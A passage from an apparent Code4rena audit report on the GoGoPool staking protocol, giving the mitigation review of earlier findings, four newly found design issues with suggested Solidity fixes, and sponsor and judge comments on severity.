> My own benchmarks show that's it's a very marginal saving, especially because it will not save gas when used in combination with `unchecked`, either way it would raise / lower the majority of reports so it will not matter as much.
> 
> Lmk about G-11 please.

**[NoamYakov (warden) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1416807927):**
 > I'm saying to cache the address of Storage in order to avoid the extra SLOAD.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1422190992):**
 > I agree with the suggested refactoring, I believe there's fair ground to cap the value of the refactoring to a certain value (e.g 5k gas saved). That said, after factoring that in, the refactoring would save the most gas.
> 
> Technically a better solution would be to just use `immutable` which would avoid all SLOADs.



***

# Mitigation Review

## Introduction

Following the C4 audit contest, 3 wardens ([hansfriese](https://twitter.com/hansfriese), RaymondFam, and [ladboy233](https://twitter.com/Xc1008Cu)) reviewed the mitigations for all identified issues. Additional details can be found within the [C4 GoGoPool Versus Mitigation Review contest repository](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest).

## Overview of Changes

**Summary from the Sponsor:**

> Here's our biggest changes to look out for:
> 
> 1. Minipool State Machine - We've tightened up the allowed state transitions including a new recreate minipool method that's atomic and doesn't allow node ops to withdraw funds or hijack a minipool.
> 2. Tracking AVAX High Water - Our previous system forced some tradeoffs to which AVAX is calculated in HighWater. We added a new variable `AVAXValidating` which tracks amount of AVAX actually validating on the P-Chain, and High Water is simply the highest validating amount during the period.
> 3. TokenGGP - Changed how tokens are inflated to actually mint rather than track tokens in the ProtocolDAO
> 4. Contract Upgrades - We're now able to upgrade as expected, to a contract with the same name as the existing contract
> 5. Upgradeable Tokens - ERC20Upgradeable takes a variable version for it's domain separator and we added storage gaps across the board

## Mitigation Review Scope

| URL                                               | Mitigation of | Purpose                                                                       |
| ------------------------------------------------- | ------------- | ----------------------------------------------------------------------------- |
| https://github.com/multisig-labs/gogopool/pull/25 | H-01          | New variable to track validating avax                                         |
| Not fixing                                        | H-02          | N/A                                                                           |
| https://github.com/multisig-labs/gogopool/pull/41 | H-03          | Base slash on validation period not full duration                             |
| https://github.com/multisig-labs/gogopool/pull/23 | H-04          | Atomically recreate minipool to now allow hijack                              |
| https://github.com/multisig-labs/gogopool/pull/49 | H-05          | Initialize ggAVAX with a deposit                                              |
| https://github.com/multisig-labs/gogopool/pull/41 | H-06          | If staked GGP doesn't cover slash amount, slash it all                        |
| https://github.com/multisig-labs/gogopool/pull/22 | M-01          | Pause startRewardsCycle when protocol is paused                               |
| https://github.com/multisig-labs/gogopool/pull/32 | M-02          | Fix upgrade to work when a contract has the same name                         |
| https://github.com/multisig-labs/gogopool/pull/20 | M-03          | Remove method that trapped Node Operator's funds                              |
| Not fixing                                        | M-04          | N/A                                                                           |
| https://github.com/multisig-labs/gogopool/pull/22 | M-05          | Pause claimAndRestake as well                                                 |
| Not fixing                                        | M-06          | N/A                                                                           |
| Not fixing                                        | M-07          | N/A                                                                           |
| https://github.com/multisig-labs/gogopool/pull/43 | M-08          | Use liquid staker avax amount instead of node op amount                       |
| https://github.com/multisig-labs/gogopool/pull/23 | M-09          | Atomically recreate minipool so a node operator can't withdraw inbetween      |
| https://github.com/multisig-labs/gogopool/pull/51 | M-10          | Reset rewards start time in cancel minipool                                   |
| Not fixing                                        | M-11          | N/A                                                                           |
| https://github.com/multisig-labs/gogopool/pull/40 | M-12          | Base cancelMinipool delay on minipool creation time not rewards start time    |
| https://github.com/multisig-labs/gogopool/pull/41 | M-13          | If staked GGP doesn't cover slash amount, slash it all                        |
| https://github.com/multisig-labs/gogopool/pull/38 | M-14          | Added bounds for duration passed by Node Operator                             |
| Not fixing in this version of the protocol        | M-15          | N/A                                                                           |
| https://github.com/multisig-labs/gogopool/pull/50 | M-16          | ggAVAX max redeem incorrect, **not fixing**, but made test to illustrate.         |
| https://github.com/multisig-labs/gogopool/pull/28 | M-17          | Remove the state transition from Staking to Error.                            |
| Not fixing in this version of the protocol        | M-18          | N/A                                                                           |
| https://github.com/multisig-labs/gogopool/pull/42 | M-19          | We removed minipool count entirely.                                           |
| https://github.com/multisig-labs/gogopool/pull/33 | M-20          | Return correct value from maxMint and maxDeposit when the contract is paused. |
| https://github.com/multisig-labs/gogopool/pull/37 | M-21          | Prevents division by zero error blocking startRewardCycle().                  |
| Not fixing in this version of the protocol        | M-22          | N/A                                                                           |

## Mitigation Review Summary

Of the mitigations reviewed, 13 have been confirmed as well as 2 confirmed with comments:

- **H-01:** Mitigation confirmed with comments (full details in [report from RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/2))
- **H-03:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/3) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/22)
- **H-05:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/5) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/24)
- **M-01:** Mitigation confirmed with comments (full details in [report from RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/12))
- **M-02:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/11) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/27)
- **M-03:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/13) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/28)
- **M-05:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/14) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/30)
- **M-09:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/15) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/34)
- **M-10:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/16) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/35)
- **M-12:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/17) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/37)
- **M-13:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/56) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/38)
- **M-14:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/57) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/39)
- **M-17:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/58) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/42)
- **M-19:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/59) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/44)
- **M-20:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/60) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/45)

The 4 remaining mitigations have either not been confirmed and/or introduced new issues. See full details below.<br>
*(Note: mitigation reviews below are referenced as `MR:S-N`, `MitigationReview:NewIssueSeverity-NewIssueNumber`)*

## [[MR:M-01] The node operators are likely to be slashed in an unfair way](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23)
*Submitted by hansfriese*

### Original Issue

H-04: [Hijacking of node operators minipool causes loss of staked funds](https://github.com/code-423n4/2022-12-gogopool-findings/issues/213)

### Comments
In the original implementation, the protocol had some unnecessary state transitions and it was possible for node operators to interfere the recreation process.<br>
The main problem was the `recordStakingEnd()` and `recreateMiniPool()` were separate external functions and the operator could frontrun the `recreateMiniPool()` and call `withdrawMinipoolFunds()`.

### Mitigation
[PR #23](https://github.com/multisig-labs/gogopool/pull/23)<br>
The mitigation added a new function `recordStakingEndThenMaybeCycle()` and handled `recordStakingEnd()` and `recreateMiniPool()` in an atomic way.<br>
With this mitigation, the state flow is now as below and it is impossible for a node operator to interfere the recreation process.<br>
![Imgur](https://imgur.com/JCoiCvl.jpg)
But this mitigation created another minor issue that the node operators have risks to be slashed in an unfair way.

### New issue
The node operators are likely to be slashed in an unfair way

### Code snippet
https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/MinipoolManager.sol#L464

### Proof of concept
In the previous implementation, I assumed rialtos are smart enough to recreate minipools only when it's necessary.<br>
But now, the recreation process is included as an optional way in the `recordStakingEndThenMaybeCycle()`, so as long as the check `initialStartTime + duration > block.timestamp` at L#464 passes, recreation will be processed.

Now let us consider the timeline. One validation cycle in the whole sense contains several steps as below.
![Imgur](https://imgur.com/p6xWqgC.jpg)

1. Let us assume it is somehow possible that `startTime[1] > endTime[0]`, i.e., the multisig failed to start the next cycle at the exact the same timestamp to the previous end time. This is quite possible due to various reasons because there are external processes included.
In this case the timeline will look as below.<br>
![Imgur](https://imgur.com/e292GIO.jpg)
As an extreme example, let us say the node operator created a minipool with duration of 42 days (with 3 cycles in mind) and it took 12 days to start the second cycle. When the `recordStakingEndThenMaybeCycle()` (finishing the second cycle) was called, two cases are possible.
- It is possible that the `initialStartTime + duration <= block.timestamp`. In this case, the protocol will not start the next cycle. And the node validation was done for two cycles different to the initial plan.
- If `initialStartTime + duration > block.timestamp`, the protocol will start the third cycle. But on the end of that cycle, it is likely that the node is not eligible for reward by the Avalanche validators voting. (Imagine the node op lent a server for 42 days, then 42-14*2-12=2 days from the third cycle start the node might have stopped working and does not meet the 80% uptime condition) Then the node operator will be punished and GGP stake will be slashed. This is unfair.

2. Assume it is 100% guaranteed that `startTime[n+1]=endTime[n]` for all cycles.<br>
The timeline will look as below and we can say the second case of the above scenario still exists if the node operator didn't specify the duration to be a complete multiple of 14 days. (365 days is not!)<br>
![Imgur](https://imgur.com/tGHnMTL.jpg)
Then the last cycle end will be later than `initialStartTime + duration` and the node op can be slashed in an unfair way again.<br>
So even assuming the perfect condition, the protocol works in kind of unfair way for node operators.

The main reason of this problem is that technically there exists two timelines. And the protocol does not track the actual validation duration that the node was used accurately.<br>
At least, the protocol should not start a new cycle if `initialStartTime + duration < block.timestamp + 14 days` because it is likely that the node operator get punished at the end of that cycle.

### Recommended additional mitigation
- If it is 100% guaranteed that `startTime[n+1]=endTime[n]` for all cycles, I recommend starting a new cycle only if `initialStartTime + duration < block.timestamp + 14 days`.
- If not, I suggest adding a new state variable that will track the actual validation period (actual utilized period).

### Conclusion
Mitigation error - created another issue for the same edge case.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23#issuecomment-1437349389):**
 > Per full discussion with sponsor and warden [here](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23#issuecomment-1433580156), Medium seems like the most appropriate Severity, the finding is valid though in that the FSM can behave in an unintended way due to lack of modulo math.



***

## [[MR:M-02] Deficiency of slashed GGP amount should be made up from node operator's AVAX](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6)
*Submitted by RaymondFam, also found by [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/25) and [ladboy233](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/61)*

https://github.com/multisig-labs/gogopool/blob/9ad393c825e6ac32f3f6c017b4926806a9383df1/contracts/contract/MinipoolManager.sol#L731-L733

### Original Issue

H-06: [MinipoolManager: node operator can avoid being slashed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/136)

### Impact
If staked GGP doesn't cover slash amount, slashing it all will not be fair to the liquid stakers. Slashing is rare, and that the current 14 day validation cycle which is typically 1/26 of the minimum amount of GGP staked is unlikely to bump into this situation unless there is a nosedive of GGP price in AVAX. The deficiency should nonetheless be made up from `avaxNodeOpAmt` should this unfortunate situation happen.

### Proof of Concept
[File: MinipoolManager.sol#L731-L733](https://github.com/multisig-labs/gogopool/blob/9ad393c825e6ac32f3f6c017b4926806a9383df1/contracts/contract/MinipoolManager.sol#L731-L733)

```solidity
		if (staking.getGGPStake(owner) < slashGGPAmt) {
			slashGGPAmt = staking.getGGPStake(owner);
		}
```
As can be seen from the code block above, in extreme and unforeseen cases, the difference between `staking.getGGPStake(owner)` and `slashGGPAmt` can be significant. Liquid stakers would typically and ultimately care about how they are going to be adequately compensated with, in AVAX preferably. 

### Recommended Mitigation Steps
Consider having the affected if block refactored as follows:

```diff
		Staking staking = Staking(getContractAddress("Staking"));
		if (staking.getGGPStake(owner) < slashGGPAmt) {
			slashGGPAmt = staking.getGGPStake(owner);

+			uint256 diff = slashGGPAmt - staking.getGGPStake(owner);
+			Oracle oracle = Oracle(getContractAddress("Oracle"));
+			(uint256 ggpPriceInAvax, ) = oracle.getGGPPriceInAVAX();
+			uint256 diffInAVAX = diff.mulWadUp(ggpPriceInAvax);
+                       staking.decreaseAVAXStake(owner, diffInAVAX);
+			Vault vault = Vault(getContractAddress("Vault"));
+			vault.transferAVAX("ProtocolDAO", diffInAVAX);
		
		}
```

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1433528943):**
 > As the warden pointed out, this event is very unlikely.
> I think that it is a reasonable risk for the protocol to take.
> Slashing does not exist in Avalanche, you simply get rewards or do not, so personally, I don't think slashing their AVAX would be a good solution as it goes against Avalanche practices. 
> Will bring it up to the team to see what they think.

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1433711442):**
 > The team seems to be in consensus that this is unlikely and that we will not be changing. The proposed solution goes against how Avalanche protocol operates so we believe it would not be an appropriate fix.

**[RaymondFam (warden) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1433960117):**
 > The proposed solution refers to slashing of AVAX in C Chain where this measure is solely at the discretion of the protocol. But I understand the complication entailed in making fixes for incidents that will be rare to occur.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1435639671):**
 > I believe the Sponsors opinion to be valid, and that the scenario may be unlikely.
>
> However, I think the math shows that the system would be taking a loss which may be notable.
> 
> I'm thinking Medium Severity would be appropriate, but a Nofix seems acceptable given the odds (a "risk treasury" could be created to account for this scenario without needing to change the contracts).



***

## [[MR:M-03] `amountAvailableForStaking()` not fully utilized with `compoundedAvaxNodeOpAmt` easily forfeited](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52)
*Submitted by RaymondFam*

https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L134-L146<br>
https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/MinipoolManager.sol#L497-L505

### Original Issue

M-08: [Recreated pools receive a wrong AVAX amount due to miscalculated compounded liquid staker amount](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620)

### Impact
The mitigated step is implemented at the expense of economic loss to both the node operators and the liquid stakers if `compoundedAvaxNodeOpAmt <= ggAVAX.amountAvailableForStaking()`.

### Proof of Concept
Here is a typical scenario:

1. The protocol now assumes that a 1:1 nodeOp:liqStaker funds ratio is guaranteed to be met because of the atomic transaction that has also been implemented.
2. This is deemed an edge case that will only be optimally utilized if `compoundedAvaxAmt == ggAVAX.amountAvailableForStaking()`.
3. The atomic transaction is going to fail if `compoundedAvaxAmt > ggAVAX.amountAvailableForStaking()` after all due to situations like liquid stakers have been actively calling [`withdrawAVAX()`](https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L196-L205).

Under normal circumstances, [`ggAVAX.amountAvailableForStaking()`](https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L134-L146) is going to be adequate enough to cater for `compoundedAvaxNodeOpAmt`. This should not be easily forfeited without first checking whether or not `ggAVAX.amountAvailableForStaking()` is greater than `compoundedAvaxNodeOpAmt`.

### Recommended Mitigation Steps
Consider implementing the following check in `recreateMinipool()` to get the best out of it:

[File: MinipoolManager.sol#L486-L517](https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/MinipoolManager.sol#L486-L517)

```diff
	function recreateMinipool(address nodeID) internal whenNotPaused {
		int256 minipoolIndex = onlyValidMultisig(nodeID);
		Minipool memory mp = getMinipool(minipoolIndex);
		MinipoolStatus currentStatus = MinipoolStatus(mp.status);

		if (currentStatus != MinipoolStatus.Withdrawable) {
			revert InvalidStateTransition();
		}

+                uint256 compoundedAvaxAmt;
+                uint256 rewardAmt;
+		if (mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt <= ggAVAX.amountAvailableForStaking()) {
+                        compoundedAvaxAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;
+                        rewardAmt = mp.avaxNodeOpRewardAmt;
+                } else {
+                        compoundedAvaxAmt = mp.avaxNodeOpAmt + mp.avaxLiquidStakerRewardAmt;
+                        rewardAmt = mp.avaxLiquidStakerRewardAmt;
+                }

		// Compound the avax plus rewards
		// NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio
-		uint256 compoundedAvaxAmt = mp.avaxNodeOpAmt + mp.avaxLiquidStakerRewardAmt;
		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), compoundedAvaxAmt);
		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), compoundedAvaxAmt);

		Staking staking = Staking(getContractAddress("Staking"));
		// Only increase AVAX stake by rewards amount we are compounding
		// since AVAX stake is only decreased by withdrawMinipool()
-		staking.increaseAVAXStake(mp.owner, mp.avaxLiquidStakerRewardAmt);
+		staking.increaseAVAXStake(mp.owner, rewardAmt);
		staking.increaseAVAXAssigned(mp.owner, compoundedAvaxAmt);

		if (staking.getRewardsStartTime(mp.owner) == 0) {
			// Edge case where calculateAndDistributeRewards has reset their rewards time even though they are still cycling
			// So we re-set it here to their initial start time for this minipool
			staking.setRewardsStartTime(mp.owner, mp.initialStartTime);
		}

		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
		uint256 ratio = staking.getCollateralizationRatio(mp.owner);
		if (ratio < dao.getMinCollateralizationRatio()) {
			revert InsufficientGGPCollateralization();
		}

		resetMinipoolData(minipoolIndex);

		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));

		emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);
	}
```

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52#issuecomment-1437348706):**
 > Per full discussion with sponsor and warden [here](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52#issuecomment-1433722646), I believe we can agree with the validity of the finding but we're unclear in terms of resolution.
>
> I'll give it a second check before awarding, but marking as valid for now.

**[RaymondFam (warden) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52#issuecomment-1437502850):**
 > Here is one solution I could suggest:
> 
> https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/utils/RialtoSimulator.sol
> 
> ```diff
> +    error UnableToProcess();
> 
> 	function processMinipoolEndWithRewards(address nodeID) public returns (MinipoolManager.Minipool memory) {
> +	        if (ggAVAX.amountAvailableForStaking() == 0) revert UnableToProcess();
> 		MinipoolManager.Minipool memory mp = minipoolMgr.getMinipoolByNodeID(nodeID);
> 		uint256 totalAvax = mp.avaxNodeOpAmt + mp.avaxLiquidStakerAmt;
> 		// Rialto queries Avalanche node to verify that validation period was successful
> 		uint256 rewards = minipoolMgr.getExpectedAVAXRewardsAmt(mp.duration, totalAvax);
> 		// Send the funds plus rewards back to MinipoolManager
> 		minipoolMgr.recordStakingEndThenMaybeCycle{value: totalAvax + rewards}(mp.nodeID, block.timestamp, rewards);
> 		mp = minipoolMgr.getMinipoolByNodeID(mp.nodeID);
> 		return mp;
> 	}
> 	
> 	function processMinipoolEndWithoutRewards(address nodeID) public returns (MinipoolManager.Minipool memory) {
> +	        if (ggAVAX.amountAvailableForStaking() == 0) revert UnableToProcess();	
> 		MinipoolManager.Minipool memory mp = minipoolMgr.getMinipoolByNodeID(nodeID);
> 		uint256 totalAvax = mp.avaxNodeOpAmt + mp.avaxLiquidStakerAmt;
> 		uint256 rewards = 0;
> 		// Send the funds plus NO rewards back to MinipoolManager
> 		minipoolMgr.recordStakingEndThenMaybeCycle{value: totalAvax + rewards}(mp.nodeID, block.timestamp, rewards);
> 		mp = minipoolMgr.getMinipoolByNodeID(mp.nodeID);
> 		return mp;
> 	}	
> ```
> The added check ensures the atomic transaction is going to reliably recreate amidst the right pick for the validating amount I recommended earlier in this issue.
> 
> Otherwise, opting for a resolution by using `canClaimAndInitiateStaking()` is going to be tricky due to the restricting `requireValidStateTransition()`.



***

## [[MR:M-04] There is no way to retrieve the rewards from the MultisigManager and rewards are locked in the vault](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46)
*Submitted by hansfriese, also found by [ladboy233](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/8)*

### Original Issue

M-21: [Division by zero error can block RewardsPool#startRewardCycle if all multisig wallet are disabled](https://github.com/code-423n4/2022-12-gogopool-findings/issues/143)

### Comments
The protocol provides an external function `startRewardsCycle()` so that anyone can start a new reward cycle if necessary.<br>
Before mitigation, there was an edge case where this function will revert due to division by zero.
Edge case: there are no multisigs enabled. (possible when `Ocyticus.disableAllMultisigs(), Ocyticus.pauseEverything()` is called)

### Mitigation
[PR #37](https://github.com/multisig-labs/gogopool/pull/37)<br>
If no multisig is enabled, the mitigation sends the rewards to the `MultisigManager` and it makes sense.<br>
But this created another issue. There is no way to retrieve the rewards back from the `MultisigManager`.

### New issue
There is no way to retrieve the rewards from the `MultisigManager` and rewards are locked in the vault.

### Code snippet
https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/RewardsPool.sol#L229

### Impact
There is no way to retrieve the rewards from the `MultisigManager` and rewards are locked in the vault.

### Proof of Concept
The rewards that were accrued in this specific edge case are locked in the `MultisigManager`.<br>
It is understood that the funds are not lost and the protocol can be upgraded with a new `MultisigManager` contract with a proper function.<br>
I evaluate the severity of the new issue as Medium because funds are locked in some specific edge cases and only withdrawable after contract upgrades.

### Recommended additional mitigation
Add a new external function in the `MultisigManager` with `guardianOrSpecificRegisteredContract("Ocyticus", msg.sender)` modifier and distribute the pending rewards to the active multisigs.

### Conclusion
Mitigation error - created another issue for the same edge case.

**[0xju1ie (GoGoPool) confirmed and commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46#issuecomment-1433705450):**
 > I think this is valid. We do plan on adding a claim or withdrawal method that allows an enabled multisig to receive those funds. This can also be easily added with an upgrade once the issue occurs if we arent able to add it to this version.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46#issuecomment-1435717627):**
 > Seems like `MultisigManager` doesn't offer a sweep function, which would cause tokens to be stuck.
>
> Due to the conditionality, I agree with Medium Severity.



***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
